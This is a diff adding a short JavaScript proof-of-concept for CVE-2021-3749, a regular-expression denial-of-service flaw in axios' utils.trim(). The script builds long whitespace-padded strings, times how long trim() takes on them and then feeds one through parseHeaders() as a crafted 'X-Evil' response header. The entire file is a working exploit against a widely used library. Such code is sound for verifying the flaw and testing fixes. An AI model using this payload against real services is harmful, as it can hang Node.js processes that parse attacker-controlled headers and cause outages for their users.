@@ -1,0 +1,31 @@
+```javascript
+// CVE-2021-3749: ReDoS in axios' utils.trim() (axios <= 0.21.1)
+// utils.trim() does: str.replace(/^\s*/, '').replace(/\s*$/, '')
+// This function is reachable from parseHeaders() on attacker-controlled
+// HTTP response header values, so a crafted header line can hang the process.
+const utils = require("./node_modules/axios/lib/utils");
+
+// Build a string of the form "1" + <n whitespace chars> + "1".
+// The unbounded \s* combined with the trailing anchor forces the regex
+// engine into O(n^2) backtracking work as n grows.
+function buildEvilString(n) {
+  return "1" + " ".repeat(n - 2) + "1";
+}
+
+console.log("Triggering axios utils.trim() ReDoS...");
+
+for (const n of [20000, 40000, 80000]) {
+  const payload = buildEvilString(n);
+  const start = Date.now();
+  utils.trim(payload);
+  const elapsed = Date.now() - start;
+  console.log(`payload length=${n} -> trim() took ${elapsed}ms`);
+}
+
+// Demonstrate the realistic sink: a raw HTTP header line parsed by axios.
+const parseHeaders = require("./node_modules/axios/lib/helpers/parseHeaders");
+const evilHeaderLine = "X-Evil:" + buildEvilString(80000);
+const t0 = Date.now();
+parseHeaders(evilHeaderLine);
+console.log(`parseHeaders() with malicious header took ${Date.now() - t0}ms`);
+```
